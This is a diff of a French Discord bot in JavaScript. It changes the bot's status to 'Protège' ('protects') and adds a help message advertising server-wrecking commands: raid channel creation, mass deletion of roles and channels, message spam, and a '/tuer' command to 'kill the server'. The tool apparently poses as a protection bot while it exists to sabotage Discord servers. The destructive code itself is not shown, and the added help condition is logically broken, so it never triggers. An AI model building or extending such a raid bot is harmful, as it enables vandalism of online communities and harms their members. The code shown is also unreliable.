@@ -8,7 +8,7 @@ const prefix = "/";
 const description = "Joue";
 
 client.on('ready', () => {
-  client.user.setPresence({ game: { name: 'Sert le serveur', type: 0}})
+  client.user.setGame('Protège' , 'https://twitch.tv/twitch%22')
     console.clear();
     console.log("Bot activé");
     console.log("");
@@ -142,7 +142,14 @@ client.on('ready', () => {
                   console.log('services du bot demandés');
                   return;
                 });
-client.on('message', message => {
+
+                client.on('message' , message => {
+                  if(message.content === prefix == 'help')
+                    message.reply('\n /raid pour créer les channels de raid \n /delroles pour supprimer les roles \n /delchannels pour supprimer les channels \n /spam pour spammer de messages \n /tuer pour tuer le serveur et tout changer')
+                  return;
+                }); 
+                     
+                     client.on('message', message => {
   if(message.content === prefix + 'avatar')
   message.reply(message.author.avatarURL);
         return;
